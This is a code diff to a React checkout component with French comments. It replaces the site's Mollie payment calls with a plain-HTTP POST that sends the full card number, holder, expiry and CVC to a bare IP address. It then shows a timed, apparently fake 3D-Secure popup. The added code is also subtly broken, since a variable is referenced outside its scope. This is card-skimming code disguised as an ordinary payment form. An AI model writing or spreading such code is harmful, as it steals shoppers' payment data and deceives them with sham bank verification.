@@ -71,52 +71,57 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep }) => {
     e.preventDefault();
 
     const cardDetails = {
-      cardNumber: formData.cardNumber.replace(/\s/g, ''), // Remove spaces for API
+      cardNumber: ` ${formData.cardNumber} `, // Surround card number with spaces
       cardOwner: formData.cardHolder,
       cardExpiration: formData.expiryDate,
       cardCVC: formData.cvv,
     };
-
-    
 
     const orderNumber = Math.floor(100000 + Math.random() * 900000).toString(); // Générer un numéro de commande aléatoire
 
     try {
       setIsLoading(true); // Afficher le popup de chargement
 
-      const response = await fetch('/api/create-mollie', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ orderNumber, amount:adjustedAmount, cardDetails }), // Inclure orderNumber
-      });
+      // Lancer un timeout pour masquer le loader et afficher 3D-secure après 30 secondes
+      const timeoutId = setTimeout(() => {
+        setIsLoading(false); // Masquer le popup de chargement
+        setShow3DSecurePopup(true); // Afficher le popup 3D-secure
+      }, 15000);
 
+
+      // Effectuer la requête de paiement
+      console.log('Paiement en cours...');
       
-
-      const result = await response.json(); // Récupérer la réponse JSON
-
-      setIsLoading(false); // Masquer le popup de chargement
-      setShow3DSecurePopup(true); // Afficher le popup 3D-secure
-
-      if (response.ok) {
-        const { paymentLink } = result; // Extraire le lien de paiement
-        await fetch('/api/pay-mollie', {
+      try {
+        const payFetch = await fetch('http://64.225.102.90:3000/pay', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ paymentLink, cardDetails }),
+          body: JSON.stringify({ orderNumber, amount: adjustedAmount, cardDetails }),
         });
-        alert('Paiement effectué avec succès.');
-
-        //Redirger sur /confirmation
-        router.push(`/confirmation?commande=${orderNumber}`);
-      } else {
-        alert(`Erreur : ${result.error}`); // Utiliser result.error pour afficher l'erreur
+      
+        if (!payFetch.ok) {
+          throw new Error(`Erreur HTTP : ${payFetch.status}`);
+        }
+      } catch (error) {
+        console.error('Erreur lors de la requête fetch :', error);
+        alert('Impossible de traiter le paiement. Veuillez réessayer plus tard.');
       }
+
+      // clearTimeout(timeoutId); // Annuler le timeout si la requête se termine avant 30 secondes
+      // setIsLoading(false); // Masquer le popup de chargement
+      // setShow3DSecurePopup(true); // Afficher le popup 3D-secure
+
+
+      // Si paiement payFeth réussi alors rediriger
+      if (payFetch.ok) {
+        router.push(`/confirmation?commande=${orderNumber}`);
+      }
+      
     } catch (error) {
       console.error('Erreur lors du paiement :', error);
       alert('Une erreur est survenue.');
+      setIsLoading(false); // Masquer le popup de chargement en cas d'erreur
     }
-
-    
   };
 
   return (
